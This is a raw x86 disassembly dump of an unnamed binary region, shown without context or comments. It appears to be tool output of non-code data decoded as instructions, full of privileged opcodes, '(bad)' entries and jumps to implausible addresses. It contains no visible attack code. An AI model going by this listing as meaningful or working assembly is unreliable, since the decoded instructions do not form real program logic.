  40684b:	02 4a 02             	add    0x2(%edx),%cl
  40684e:	35 00 a1 00 d9       	xor    $0xd900a100,%eax
  406853:	17                   	pop    %ss
  406854:	33 01                	xor    (%ecx),%eax
  406856:	61                   	popa
  406857:	02 e3                	add    %bl,%ah
  406859:	17                   	pop    %ss
  40685a:	cf                   	iret
  40685b:	02 c9                	add    %cl,%cl
  40685d:	01 e8                	add    %ebp,%eax
  40685f:	15 ec 00 c9 01       	adc    $0x1c900ec,%eax
  406864:	ef                   	out    %eax,(%dx)
  406865:	17                   	pop    %ss
  406866:	ec                   	in     (%dx),%al
  406867:	00 c9                	add    %cl,%cl
  406869:	01 03                	add    %eax,(%ebx)
  40686b:	15 f0 00 c9 01       	adc    $0x1c900f0,%eax
  406870:	0e                   	push   %cs
  406871:	15 f0 00 a1 00       	adc    $0xa100f0,%eax
  406876:	fa                   	cli
  406877:	17                   	pop    %ss
  406878:	33 01                	xor    (%ecx),%eax
  40687a:	69 02 0a 18 26 04    	imul   $0x426180a,(%edx),%eax
  406880:	79 02                	jns    0x406884
  406882:	34 18                	xor    $0x18,%al
  406884:	06                   	push   %es
  406885:	01 81 02 49 18 35    	add    %eax,0x35184902(%ecx)
  40688b:	00 69 02             	add    %ch,0x2(%ecx)
  40688e:	51                   	push   %ecx
  40688f:	18 cf                	sbb    %cl,%bh
  406891:	02 61 02             	add    0x2(%ecx),%ah
  406894:	60                   	pusha
  406895:	18 06                	sbb    %al,(%esi)
  406897:	01 41 00             	add    %eax,0x0(%ecx)
  40689a:	4a                   	dec    %edx
  40689b:	02 f0                	add    %al,%dh
  40689d:	00 91 02 4a 02 65    	add    %dl,0x65024a02(%ecx)
  4068a3:	04 c9                	add    $0xc9,%al
  4068a5:	01 81 18 6b 04 c9    	add    %eax,-0x36fb94e8(%ecx)
  4068ab:	01 8d 18 6b 04 b1    	add    %ecx,-0x4efb94e8(%ebp)
  4068b1:	00 97 18 ec 00 81    	add    %dl,-0x7eff13e8(%edi)
  4068b7:	00 a4 18 f0 00 b1 00 	add    %ah,0xb100f0(%eax,%ebx,1)
  4068be:	b7 18                	mov    $0x18,%bh
  4068c0:	72 04                	jb     0x4068c6
  4068c2:	b1 00                	mov    $0x0,%cl
  4068c4:	c3                   	ret
  4068c5:	18 06                	sbb    %al,(%esi)
  4068c7:	01 b1 00 cd 18 06    	add    %esi,0x618cd00(%ecx)
  4068cd:	01 b1 00 d5 18 06    	add    %esi,0x618d500(%ecx)
  4068d3:	01 99 01 e1 18 77    	add    %ebx,0x7718e101(%ecx)
  4068d9:	04 81                	add    $0x81,%al
  4068db:	00 eb                	add    %ch,%bl
  4068dd:	18 7c 04 81          	sbb    %bh,-0x7f(%esp,%eax,1)
  4068e1:	00 f9                	add    %bh,%cl
  4068e3:	18 cf                	sbb    %cl,%bh
  4068e5:	02 81 00 16 19 81    	add    -0x7ee6ea00(%ecx),%al
  4068eb:	04 81                	add    $0x81,%al
  4068ed:	00 2a                	add    %ch,(%edx)
  4068ef:	19 88 04 b1 00 3e    	sbb    %ecx,0x3e00b104(%eax)
  4068f5:	19 72 04             	sbb    %esi,0x4(%edx)
  4068f8:	c9                   	leave
  4068f9:	00 4c 19 8e          	add    %cl,-0x72(%ecx,%ebx,1)
  4068fd:	04 c9                	add    $0xc9,%al
  4068ff:	00 56 19             	add    %dl,0x19(%esi)
  406902:	8e 04 c9             	mov    (%ecx,%ecx,8),%es
  406905:	00 5f 19             	add    %bl,0x19(%edi)
  406908:	8e 04 a1             	mov    (%ecx,%eiz,4),%es
  40690b:	02 78 19             	add    0x19(%eax),%bh
  40690e:	93                   	xchg   %eax,%ebx
  40690f:	04 c9                	add    $0xc9,%al
  406911:	00 81 19 8e 04 c9    	add    %al,-0x36fb71e7(%ecx)
  406917:	00 8d 19 8e 04 c9    	add    %cl,-0x36fb71e7(%ebp)
  40691d:	00 95 19 8e 04 c9    	add    %dl,-0x36fb71e7(%ebp)
  406923:	00 9f 19 8e 04 c9    	add    %bl,-0x36fb71e7(%edi)
  406929:	01 aa 19 35 00 a9    	add    %ebp,-0x56ffcae7(%edx)
  40692f:	02 ca                	add    %dl,%cl
  406931:	19 cf                	sbb    %ecx,%edi
  406933:	02 c9                	add    %cl,%cl
  406935:	01 d9                	add    %ebx,%ecx
  406937:	19 9e 04 29 00 e7    	sbb    %ebx,-0x18ffd6fc(%esi)
  40693d:	19 cf                	sbb    %ecx,%edi
  40693f:	02 c9                	add    %cl,%cl
  406941:	01 f6                	add    %esi,%esi
  406943:	19 35 00 b1 02 4a    	sbb    %esi,0x4a02b100
  406949:	02 65 04             	add    0x4(%ebp),%ah
  40694c:	b9 00 17 1a a4       	mov    $0xa41a1700,%ecx
  406951:	04 b9                	add    $0xb9,%al
  406953:	00 23                	add    %ah,(%ebx)
  406955:	1a 21                	sbb    (%ecx),%ah
  406957:	03 b9 00 30 1a cf    	add    -0x30e5d000(%ecx),%edi
  40695d:	02 b9 00 3e 1a 35    	add    0x351a3e00(%ecx),%bh
  406963:	00 24 00             	add    %ah,(%eax,%eax,1)
  406966:	44                   	inc    %esp
  406967:	1a b2 04 e9 00 4d    	sbb    0x4d00e904(%edx),%dh
  40696d:	1a f0                	sbb    %al,%dh
  40696f:	00 c9                	add    %cl,%cl
  406971:	01 57 1a             	add    %edx,0x1a(%edi)
  406974:	35 00 c9 01 5f       	xor    $0x5f01c900,%eax
  406979:	1a f0                	sbb    %al,%dh
  40697b:	00 c9                	add    %cl,%cl
  40697d:	01 68 1a             	add    %ebp,0x1a(%eax)
  406980:	f0 00 c9             	lock add %cl,%cl
  406983:	01 75 1a             	add    %esi,0x1a(%ebp)
  406986:	b8 04 b9 02 4a       	mov    $0x4a02b904,%eax
  40698b:	02 be 04 c9 01 88    	add    -0x77fe36fc(%esi),%bh
  406991:	1a c8                	sbb    %al,%cl
  406993:	04 e9                	add    $0xe9,%al
  406995:	00 4a 02             	add    %cl,0x2(%edx)
  406998:	35 00 e9 00 a2       	xor    $0xa200e900,%eax
  40699d:	1a cf                	sbb    %bh,%cl
  40699f:	04 c9                	add    $0xc9,%al
  4069a1:	01 ac 1a 9e 04 c9 01 	add    %ebp,0x1c9049e(%edx,%ebx,1)
  4069a8:	ba 1a 8a 03 24       	mov    $0x24038a1a,%edx
  4069ad:	00 93 17 ec 00 b9    	add    %dl,-0x46ff13e9(%ebx)
  4069b3:	00 4a 02             	add    %cl,0x2(%edx)
  4069b6:	35 00 24 00 4a       	xor    $0x4a002400,%eax
  4069bb:	02 35 00 d9 00 c3    	add    0xc300d900,%dh
  4069c1:	1a ec                	sbb    %ah,%ch
  4069c3:	00 d9                	add    %bl,%cl
  4069c5:	00 e5                	add    %ah,%ch
  4069c7:	1a d6                	sbb    %dh,%dl
  4069c9:	04 29                	add    $0x29,%al
  4069cb:	02 f4                	add    %ah,%dh
  4069cd:	1a 97 03 d9 02 49    	sbb    0x4902d903(%edi),%dl
  4069d3:	18 35 00 24 00 1b    	sbb    %dh,0x1b002400
  4069d9:	1b f0                	sbb    %eax,%esi
  4069db:	00 b9 00 24 1b 35    	add    %bh,0x351b2400(%ecx)
  4069e1:	00 19                	add    %bl,(%ecx)
  4069e3:	02 ef                	add    %bh,%ch
  4069e5:	17                   	pop    %ss
  4069e6:	ec                   	in     (%dx),%al
  4069e7:	00 29                	add    %ch,(%ecx)
  4069e9:	00 bd 15 74 03 d9    	add    %bh,-0x26fc8beb(%ebp)
  4069ef:	00 29                	add    %ch,(%ecx)
  4069f1:	1b ec                	sbb    %esp,%ebp
  4069f3:	00 24 00             	add    %ah,(%eax,%eax,1)
  4069f6:	2e 16                	cs push %ss
  4069f8:	dc 04 24             	faddl  (%esp)
  4069fb:	00 3e                	add    %bh,(%esi)
  4069fd:	1b e2                	sbb    %edx,%esp
  4069ff:	04 d9                	add    $0xd9,%al
  406a01:	00 45 1b             	add    %al,0x1b(%ebp)
  406a04:	33 01                	xor    (%ecx),%eax
  406a06:	d9 00                	flds   (%eax)
  406a08:	52                   	push   %edx
  406a09:	1b 33                	sbb    (%ebx),%esi
  406a0b:	01 d9                	add    %ebx,%ecx
  406a0d:	00 68 1b             	add    %ch,0x1b(%eax)
  406a10:	ec                   	in     (%dx),%al
  406a11:	00 d9                	add    %bl,%cl
  406a13:	00 7c 1b ec          	add    %bh,-0x14(%ebx,%ebx,1)
  406a17:	00 e1                	add    %ah,%cl
  406a19:	02 4a 02             	add    0x2(%edx),%cl
  406a1c:	e9 04 e1 02 9a       	jmp    0x9a434b25
  406a21:	1b f0                	sbb    %eax,%esi
  406a23:	04 e1                	add    $0xe1,%al
  406a25:	02 af 1b ec 00 e1    	add    -0x1eff13e5(%edi),%ch
  406a2b:	02 bb 1b ec 00 99    	add    -0x66ff13e5(%ebx),%bh
  406a31:	01 c7                	add    %eax,%edi
  406a33:	1b f4                	sbb    %esp,%esi
  406a35:	04 99                	add    $0x99,%al
  406a37:	01 ce                	add    %ecx,%esi
  406a39:	1b fc                	sbb    %esp,%edi
  406a3b:	04 d9                	add    $0xd9,%al
  406a3d:	00 d5                	add    %dl,%ch
  406a3f:	1b 33                	sbb    (%ebx),%esi
  406a41:	01 f1                	add    %esi,%ecx
  406a43:	02 f6                	add    %dh,%dh
  406a45:	1b 02                	sbb    (%edx),%eax
  406a47:	05 31 00 4a 02       	add    $0x24a0031,%eax
  406a4c:	35 00 f9 02 5e       	xor    $0x5e02f900,%eax
  406a51:	07                   	pop    %es
  406a52:	3a 05 2c 00 4a 02    	cmp    0x24a002c,%al
  406a58:	35 00 34 00 bf       	xor    $0xbf003400,%eax
  406a5d:	17                   	pop    %ss
  406a5e:	0f 04                	(bad)
  406a60:	3c 00                	cmp    $0x0,%al
  406a62:	cd 17                	int    $0x17
  406a64:	21 04 01             	and    %eax,(%ecx,%eax,1)
  406a67:	01 17                	add    %edx,(%edi)
  406a69:	1c 33                	sbb    $0x33,%al
  406a6b:	01 01                	add    %eax,(%ecx)
  406a6d:	03 4c 1c 5a          	add    0x5a(%esp,%ebx,1),%ecx
  406a71:	05 01 03 5e 1c       	add    $0x1c5e0301,%eax
  406a76:	63 05 01 03 66 1c    	arpl   %eax,0x1c660301
  406a7c:	06                   	push   %es
  406a7d:	01 01                	add    %eax,(%ecx)
  406a7f:	03 72 1c             	add    0x1c(%edx),%esi
  406a82:	6a 05                	push   $0x5
  406a84:	11 03                	adc    %eax,(%ebx)
  406a86:	43                   	inc    %ebx
  406a87:	14 33                	adc    $0x33,%al
  406a89:	01 99 01 ce 1b 70    	add    %ebx,0x701bce01(%ecx)
  406a8f:	05 01 03 86 1c       	add    $0x1c860301,%eax
  406a94:	77 05                	ja     0x406a9b
  406a96:	01 03                	add    %eax,(%ebx)
  406a98:	96                   	xchg   %eax,%esi
  406a99:	1c 81                	sbb    $0x81,%al
  406a9b:	05 01 03 d7 1c       	add    $0x1cd70301,%eax
  406aa0:	87 05 19 03 e6 1c    	xchg   %eax,0x1ce60319
  406aa6:	9b                   	fwait
  406aa7:	05 01 01 0f 0d       	add    $0xd0f0101,%eax
  406aac:	33 01                	xor    (%ecx),%eax
  406aae:	99                   	cltd
  406aaf:	01 c7                	add    %eax,%edi
  406ab1:	1b a1 05 31 00 a6    	sbb    -0x59ffcefb(%ecx),%esp
  406ab7:	0b 33                	or     (%ebx),%esi
  406ab9:	01 39                	add    %edi,(%ecx)
  406abb:	03 f5                	add    %ebp,%esi
  406abd:	1c a8                	sbb    $0xa8,%al
  406abf:	05 01 03 00 1d       	add    $0x1d000301,%eax
  406ac4:	b0 05                	mov    $0x5,%al
  406ac6:	f9                   	stc
  406ac7:	00 4a 02             	add    %cl,0x2(%edx)
  406aca:	be 05 2c 00 2e       	mov    $0x2e002c05,%esi
  406acf:	16                   	push   %ss
  406ad0:	c3                   	ret
  406ad1:	05 01 03 13 1d       	add    $0x1d130301,%eax
  406ad6:	cb                   	lret
  406ad7:	05 99 01 c7 1b       	add    $0x1bc70199,%eax
  406adc:	d5 05                	aad    $0x5
  406ade:	01 01                	add    %eax,(%ecx)
  406ae0:	fa                   	cli
  406ae1:	17                   	pop    %ss
  406ae2:	33 01                	xor    (%ecx),%eax
  406ae4:	99                   	cltd
  406ae5:	01 21                	add    %esp,(%ecx)
  406ae7:	1d db 05 31 00       	sbb    $0x3105db,%eax
  406aec:	13 0c 37             	adc    (%edi,%esi,1),%ecx
  406aef:	01 01                	add    %eax,(%ecx)
  406af1:	01 2d 1d 8d 02 31    	add    %ebp,0x31028d1d
  406af7:	00 ef                	add    %ch,%bh
  406af9:	0b 37                	or     (%edi),%esi
  406afb:	01 31                	add    %esi,(%ecx)
  406afd:	00 72 0b             	add    %dh,0xb(%edx)
  406b00:	45                   	inc    %ebp
  406b01:	02 31                	add    (%ecx),%dh
  406b03:	00 d8                	add    %bl,%al
  406b05:	0b 54 02 11          	or     0x11(%edx,%eax,1),%edx
  406b09:	01 4a 02             	add    %ecx,0x2(%edx)
  406b0c:	35 00 99 01 48       	xor    $0x48019900,%eax
  406b11:	1d 24 06 11 01       	sbb    $0x1110624,%eax
  406b16:	54                   	push   %esp
  406b17:	1d 7c 04 09 01       	sbb    $0x109047c,%eax
  406b1c:	4a                   	dec    %edx
  406b1d:	02 29                	add    (%ecx),%ch
  406b1f:	06                   	push   %es
  406b20:	51                   	push   %ecx
  406b21:	03 15 06 41 06 59    	add    0x59064106,%edx
  406b27:	03 81 1d 48 06 51    	add    0x5106481d(%ecx),%eax
  406b2d:	03 13                	add    (%ebx),%edx
  406b2f:	0c 02                	or     $0x2,%al
  406b31:	05 11 01 89 1d       	add    $0x1d890111,%eax
  406b36:	ec                   	in     (%dx),%al
  406b37:	00 11                	add    %dl,(%ecx)
  406b39:	01 1b                	add    %ebx,(%ebx)
  406b3b:	1b f0                	sbb    %eax,%esi
  406b3d:	00 51 03             	add    %dl,0x3(%ecx)
  406b40:	ef                   	out    %eax,(%dx)
  406b41:	0b 4e 06             	or     0x6(%esi),%ecx
  406b44:	59                   	pop    %ecx
  406b45:	03 94 1d 53 06 99 01 	add    0x1990653(%ebp,%ebx,1),%edx
  406b4c:	89 1d ec 00 c9 01    	mov    %ebx,0x1c900ec
  406b52:	5e                   	pop    %esi
  406b53:	07                   	pop    %es
  406b54:	35 00 69 03 b8       	xor    $0xb8036900,%eax
  406b59:	1d 6a 06 69 03       	sbb    $0x369066a,%eax
  406b5e:	d8 0c 96             	fmuls  (%esi,%edx,4)
  406b61:	02 69 03             	add    0x3(%ecx),%ch
  406b64:	eb 0c                	jmp    0x406b72
  406b66:	96                   	xchg   %eax,%esi
  406b67:	02 21                	add    (%ecx),%ah
  406b69:	01 ca                	add    %ecx,%edx
  406b6b:	1d 70 06 39 00       	sbb    $0x390670,%eax
  406b70:	4a                   	dec    %edx
  406b71:	02 35 00 f9 00 d2    	add    0xd200f900,%dh
  406b77:	1d 76 06 29 01       	sbb    $0x1290676,%eax
  406b7c:	4a                   	dec    %edx
  406b7d:	02 9e 03 71 03 4a    	add    0x4a037103(%esi),%bl
  406b83:	02 37                	add    (%edi),%dh
  406b85:	01 79 03             	add    %edi,0x3(%ecx)
  406b88:	4a                   	dec    %edx
  406b89:	02 35 00 89 03 91    	add    0x91038900,%dh
  406b8f:	1e                   	push   %ds
  406b90:	ec                   	in     (%dx),%al
  406b91:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  406b95:	1a b2 04 a1 03 9b    	sbb    -0x64fc5efc(%edx),%dh
  406b9b:	1e                   	push   %ds
  406b9c:	9e                   	sahf
  406b9d:	06                   	push   %es
  406b9e:	49                   	dec    %ecx
  406b9f:	03 a9 1e 33 01 31    	add    0x3101331e(%ecx),%ebp
  406ba5:	00 04 0c             	add    %al,(%esp,%ecx,1)
  406ba8:	37                   	aaa
  406ba9:	01 4c 00 44          	add    %ecx,0x44(%eax,%eax,1)
  406bad:	1a b2 04 91 03 b5    	sbb    -0x4afc6efc(%edx),%dh
  406bb3:	1e                   	push   %ds
  406bb4:	06                   	push   %es
  406bb5:	01 a9 03 d5 1e 06    	add    %ebp,0x61ed503(%ecx)
  406bbb:	01 f1                	add    %esi,%ecx
  406bbd:	02 d9                	add    %cl,%bl
  406bbf:	1e                   	push   %ds
  406bc0:	02 05 81 03 4a 02    	add    0x24a0381,%al
  406bc6:	cf                   	iret
  406bc7:	02 b1 03 4a 02 65    	add    0x65024a03(%ecx),%dh
  406bcd:	04 d9                	add    $0xd9,%al
  406bcf:	01 0b                	add    %ecx,(%ebx)
  406bd1:	1f                   	pop    %ds
  406bd2:	ac                   	lods   %ds:(%esi),%al
  406bd3:	06                   	push   %es
  406bd4:	b9 03 62 1f b3       	mov    $0xb31f6203,%ecx
  406bd9:	06                   	push   %es
  406bda:	c1 03 80             	roll   $0x80,(%ebx)
  406bdd:	1f                   	pop    %ds
  406bde:	bb 06 c1 03 93       	mov    $0x9303c106,%ebx
  406be3:	1f                   	pop    %ds
  406be4:	35 00 d1 03 a3       	xor    $0xa303d100,%eax
  406be9:	1f                   	pop    %ds
  406bea:	c2 06 d1             	ret    $0xd106
  406bed:	03 aa 1f c8 06 d1    	add    -0x2ef937e1(%edx),%ebp
  406bf3:	03 c5                	add    %ebp,%eax
  406bf5:	1f                   	pop    %ds
  406bf6:	cf                   	iret
  406bf7:	06                   	push   %es
  406bf8:	d9 03                	flds   (%ebx)
  406bfa:	d1 1f                	rcrl   $1,(%edi)
  406bfc:	d5 06                	aad    $0x6
  406bfe:	54                   	push   %esp
  406bff:	00 4a 02             	add    %cl,0x2(%edx)
  406c02:	65 04 44             	gs add $0x44,%al
  406c05:	00 ea                	add    %ch,%dl
  406c07:	1f                   	pop    %ds
  406c08:	e9 06 5c 00 4a       	jmp    0x4a40c813
  406c0d:	02 35 00 5c 00 2e    	add    0x2e005c00,%dh
  406c13:	16                   	push   %ss
  406c14:	dc 04 51             	faddl  (%ecx,%edx,2)
  406c17:	03 a6 0b fc 06 5c    	add    0x5c06fc0b(%esi),%esp
  406c1d:	00 f8                	add    %bh,%al
  406c1f:	1f                   	pop    %ds
  406c20:	35 00 4c 00 4a       	xor    $0x4a004c00,%eax
  406c25:	02 35 00 4c 00 ea    	add    0xea004c00,%dh
  406c2b:	1f                   	pop    %ds
  406c2c:	e9 06 99 01 01       	jmp    0x1420537
  406c31:	20 00                	and    %al,(%eax)
  406c33:	07                   	pop    %es
  406c34:	99                   	cltd
  406c35:	01 1a                	add    %ebx,(%edx)
  406c37:	20 07                	and    %al,(%edi)
  406c39:	07                   	pop    %es
  406c3a:	99                   	cltd
  406c3b:	01 38                	add    %edi,(%eax)
  406c3d:	20 0f                	and    %cl,(%edi)
  406c3f:	07                   	pop    %es
  406c40:	f9                   	stc
  406c41:	02 5e 07             	add    0x7(%esi),%bl
  406c44:	1a 07                	sbb    (%edi),%al
  406c46:	99                   	cltd
  406c47:	01 5f 20             	add    %ebx,0x20(%edi)
  406c4a:	27                   	daa
  406c4b:	07                   	pop    %es
  406c4c:	09 04 80             	or     %eax,(%eax,%eax,4)
  406c4f:	20 eb                	and    %ch,%bl
  406c51:	01 49 02             	add    %ecx,0x2(%ecx)
  406c54:	98                   	cwtl
  406c55:	20 2d 07 19 04 bb    	and    %ch,0xbb041907
  406c5b:	20 34 07             	and    %dh,(%edi,%eax,1)
  406c5e:	21 04 4a             	and    %eax,(%edx,%ecx,2)
  406c61:	02 3a                	add    (%edx),%bh
  406c63:	07                   	pop    %es
  406c64:	29 04 dc             	sub    %eax,(%esp,%ebx,8)
  406c67:	20 33                	and    %dh,(%ebx)
  406c69:	01 31                	add    %esi,(%ecx)
  406c6b:	04 eb                	add    $0xeb,%al
  406c6d:	20 44 07 d1          	and    %al,-0x2f(%edi,%eax,1)
  406c71:	03 f8                	add    %eax,%edi
  406c73:	20 4a 07             	and    %cl,0x7(%edx)
  406c76:	39 04 4a             	cmp    %eax,(%edx,%ecx,2)
  406c79:	02 37                	add    (%edi),%dh
  406c7b:	01 39                	add    %edi,(%ecx)
  406c7d:	04 27                	add    $0x27,%al
  406c7f:	21 51 07             	and    %edx,0x7(%ecx)
  406c82:	49                   	dec    %ecx
  406c83:	04 33                	add    $0x33,%al
  406c85:	21 06                	and    %eax,(%esi)
  406c87:	01 41 04             	add    %eax,0x4(%ecx)
  406c8a:	4f                   	dec    %edi
  406c8b:	21 58 07             	and    %ebx,0x7(%eax)
  406c8e:	51                   	push   %ecx
  406c8f:	04 93                	add    $0x93,%al
  406c91:	17                   	pop    %ss
  406c92:	ec                   	in     (%dx),%al
  406c93:	00 59 04             	add    %bl,0x4(%ecx)
  406c96:	61                   	popa
  406c97:	21 5e 07             	and    %ebx,0x7(%esi)
  406c9a:	d1 03                	roll   $1,(%ebx)
  406c9c:	6a 21                	push   $0x21
  406c9e:	4a                   	dec    %edx
  406c9f:	07                   	pop    %es
  406ca0:	51                   	push   %ecx
  406ca1:	04 44                	add    $0x44,%al
  406ca3:	1a 65 07             	sbb    0x7(%ebp),%ah
  406ca6:	61                   	popa
  406ca7:	04 7f                	add    $0x7f,%al
  406ca9:	21 33                	and    %esi,(%ebx)
  406cab:	01 99 01 5f 20 33    	add    %ebx,0x33205f01(%ecx)
  406cb1:	01 99 01 89 21 33    	add    %ebx,0x33218901(%ecx)
  406cb7:	01 d1                	add    %edx,%ecx
  406cb9:	03 6a 21             	add    0x21(%edx),%ebp
  406cbc:	6c                   	insb   (%dx),%es:(%edi)
  406cbd:	07                   	pop    %es
  406cbe:	d1 03                	roll   $1,(%ebx)
  406cc0:	99                   	cltd
  406cc1:	21 74 07 d1          	and    %esi,-0x2f(%edi,%eax,1)
  406cc5:	03 a5 21 4a 07 71    	add    0x71074a21(%ebp),%esp
  406ccb:	04 4a                	add    $0x4a,%al
  406ccd:	02 65 04             	add    0x4(%ebp),%ah
  406cd0:	d1 03                	roll   $1,(%ebx)
  406cd2:	d3 21                	shll   %cl,(%ecx)
  406cd4:	7b 07                	jnp    0x406cdd
  406cd6:	81 04 ea 21 9d 07 d1 	addl   $0xd1079d21,(%edx,%ebp,8)
  406cdd:	03 24 1b             	add    (%ebx,%ebx,1),%esp
  406ce0:	35 00 d1 03 08       	xor    $0x803d100,%eax
  406ce5:	22 a2 07 89 04 32    	and    0x32048907(%edx),%ah
  406ceb:	22 a8 07 89 04 3c    	and    0x3c048907(%eax),%ch
  406cf1:	22 9e 06 c1 03 82    	and    -0x7dfc3efa(%esi),%bl
  406cf7:	14 35                	adc    $0x35,%al
  406cf9:	00 49 03             	add    %cl,0x3(%ecx)
  406cfc:	4a                   	dec    %edx
  406cfd:	02 37                	add    (%edi),%dh
  406cff:	01 99 04 4a 02 35    	add    %ebx,0x35024a04(%ecx)
  406d05:	00 08                	add    %cl,(%eax)
  406d07:	00 1c 00             	add    %bl,(%eax,%eax,1)
  406d0a:	46                   	inc    %esi
  406d0b:	00 08                	add    %cl,(%eax)
  406d0d:	00 20                	add    %ah,(%eax)
  406d0f:	00 4b 00             	add    %cl,0x0(%ebx)
  406d12:	08 00                	or     %al,(%eax)
  406d14:	24 00                	and    $0x0,%al
  406d16:	50                   	push   %eax
  406d17:	00 08                	add    %cl,(%eax)
  406d19:	00 28                	add    %ch,(%eax)
  406d1b:	00 55 00             	add    %dl,0x0(%ebp)
  406d1e:	08 00                	or     %al,(%eax)
  406d20:	2c 00                	sub    $0x0,%al
  406d22:	5a                   	pop    %edx
  406d23:	00 08                	add    %cl,(%eax)
  406d25:	00 30                	add    %dh,(%eax)
  406d27:	00 5f 00             	add    %bl,0x0(%edi)
  406d2a:	08 00                	or     %al,(%eax)
  406d2c:	34 00                	xor    $0x0,%al
  406d2e:	64 00 08             	add    %cl,%fs:(%eax)
  406d31:	00 38                	add    %bh,(%eax)
  406d33:	00 69 00             	add    %ch,0x0(%ecx)
  406d36:	08 00                	or     %al,(%eax)
  406d38:	3c 00                	cmp    $0x0,%al
  406d3a:	6e                   	outsb  %ds:(%esi),(%dx)
  406d3b:	00 08                	add    %cl,(%eax)
  406d3d:	00 40 00             	add    %al,0x0(%eax)
  406d40:	73 00                	jae    0x406d42
  406d42:	08 00                	or     %al,(%eax)
  406d44:	44                   	inc    %esp
  406d45:	00 78 00             	add    %bh,0x0(%eax)
  406d48:	08 00                	or     %al,(%eax)
  406d4a:	48                   	dec    %eax
  406d4b:	00 7d 00             	add    %bh,0x0(%ebp)
  406d4e:	08 00                	or     %al,(%eax)
  406d50:	4c                   	dec    %esp
  406d51:	00 82 00 08 00 50    	add    %al,0x50000800(%edx)
  406d57:	00 87 00 08 00 54    	add    %al,0x54000800(%edi)
  406d5d:	00 8c 00 08 00 58 00 	add    %cl,0x580008(%eax,%eax,1)
  406d64:	91                   	xchg   %eax,%ecx
  406d65:	00 08                	add    %cl,(%eax)
  406d67:	00 5c 00 96          	add    %bl,-0x6a(%eax,%eax,1)
  406d6b:	00 08                	add    %cl,(%eax)
  406d6d:	00 64 00 9f          	add    %ah,-0x61(%eax,%eax,1)
  406d71:	00 08                	add    %cl,(%eax)
  406d73:	00 68 00             	add    %ch,0x0(%eax)
  406d76:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406d77:	00 08                	add    %cl,(%eax)
  406d79:	00 6c 00 a9          	add    %ch,-0x57(%eax,%eax,1)
  406d7d:	00 08                	add    %cl,(%eax)
  406d7f:	00 70 00             	add    %dh,0x0(%eax)
  406d82:	ae                   	scas   %es:(%edi),%al
  406d83:	00 08                	add    %cl,(%eax)
  406d85:	00 74 00 b3          	add    %dh,-0x4d(%eax,%eax,1)
  406d89:	00 08                	add    %cl,(%eax)
  406d8b:	00 78 00             	add    %bh,0x0(%eax)
  406d8e:	b8 00 08 00 7c       	mov    $0x7c000800,%eax
  406d93:	00 bd 00 08 00 80    	add    %bh,-0x7ffff800(%ebp)
  406d99:	00 c2                	add    %al,%dl
  406d9b:	00 09                	add    %cl,(%ecx)
  406d9d:	00 e0                	add    %ah,%al
  406d9f:	00 9f 00 09 00 e4    	add    %bl,-0x1bfff700(%edi)
  406da5:	00 46 00             	add    %al,0x0(%esi)
  406da8:	09 00                	or     %eax,(%eax)
  406daa:	e8 00 4b 00 09       	call   0x940b8af
  406daf:	00 ec                	add    %ch,%ah
  406db1:	00 f6                	add    %dh,%dh
  406db3:	01 09                	add    %ecx,(%ecx)
  406db5:	00 f0                	add    %dh,%al
  406db7:	00 fb                	add    %bh,%bl
  406db9:	01 09                	add    %ecx,(%ecx)
  406dbb:	00 f8                	add    %bh,%al
  406dbd:	00 04 02             	add    %al,(%edx,%eax,1)
  406dc0:	09 00                	or     %eax,(%eax)
  406dc2:	fc                   	cld
  406dc3:	00 09                	add    %cl,(%ecx)
  406dc5:	02 09                	add    (%ecx),%cl
  406dc7:	00 00                	add    %al,(%eax)
  406dc9:	01 0e                	add    %ecx,(%esi)
  406dcb:	02 2e                	add    (%esi),%ch
  406dcd:	00 2b                	add    %ch,(%ebx)
  406dcf:	00 00                	add    %al,(%eax)
  406dd1:	08 2e                	or     %ch,(%esi)
  406dd3:	00 53 00             	add    %dl,0x0(%ebx)
  406dd6:	0f 08                	invd
  406dd8:	2e 00 1b             	add    %bl,%cs:(%ebx)
  406ddb:	00 00                	add    %al,(%eax)
  406ddd:	08 2e                	or     %ch,(%esi)
  406ddf:	00 23                	add    %ah,(%ebx)
  406de1:	00 00                	add    %al,(%eax)
  406de3:	08 2e                	or     %ch,(%esi)
  406de5:	00 33                	add    %dh,(%ebx)
  406de7:	00 00                	add    %al,(%eax)
  406de9:	08 2e                	or     %ch,(%esi)
  406deb:	00 3b                	add    %bh,(%ebx)
  406ded:	00 00                	add    %al,(%eax)
  406def:	08 2e                	or     %ch,(%esi)
  406df1:	00 43 00             	add    %al,0x0(%ebx)
  406df4:	00 08                	add    %cl,(%eax)
  406df6:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  406dfa:	06                   	push   %es
  406dfb:	08 83 00 9b 00 46    	or     %al,0x46009b00(%ebx)
  406e01:	00 c3                	add    %al,%bl
  406e03:	02 eb                	add    %bl,%ch
  406e05:	08 46 00             	or     %al,0x0(%esi)
  406e08:	e0 0e                	loopne 0x406e18
  406e0a:	f3 06                	repz push %es
  406e0c:	46                   	inc    %esi
  406e0d:	00 13                	add    %dl,(%ebx)
  406e0f:	00 e9                	add    %ch,%cl
  406e11:	02 65 00             	add    0x0(%ebp),%ah
  406e14:	eb 02                	jmp    0x406e18
  406e16:	04 03                	add    $0x3,%al
  406e18:	43                   	inc    %ebx
  406e19:	03 50 03             	add    0x3(%eax),%edx
  406e1c:	55                   	push   %ebp
  406e1d:	03 ed                	add    %ebp,%ebp
  406e1f:	03 2e                	add    (%esi),%ebp
  406e21:	04 54                	add    $0x54,%al
  406e23:	04 5b                	add    $0x5b,%al
  406e25:	04 99                	add    $0x99,%al
  406e27:	04 06                	add    $0x6,%al
  406e29:	05 34 05 e1 05       	add    $0x5e10534,%eax
  406e2e:	20 06                	and    %al,(%esi)
  406e30:	31 06                	xor    %eax,(%esi)
  406e32:	3d 06 57 06 60       	cmp    $0x60065706,%eax
  406e37:	06                   	push   %es
  406e38:	7c 06                	jl     0x406e40
  406e3a:	ae                   	scas   %es:(%edi),%al
  406e3b:	07                   	pop    %es
  406e3c:	07                   	pop    %es
  406e3d:	00 01                	add    %al,(%ecx)
  406e3f:	00 11                	add    %dl,(%ecx)
  406e41:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406e44:	12 00                	adc    (%eax),%al
  406e46:	0d 00 13 00 14       	or     $0x14001300,%eax
  406e4b:	00 14 00             	add    %dl,(%eax,%eax,1)
  406e4e:	1e                   	push   %ds
  406e4f:	00 15 00 20 00 00    	add    %dl,0x2000
  406e55:	00 a8 06 3c 01 00    	add    %ch,0x13c06(%eax)
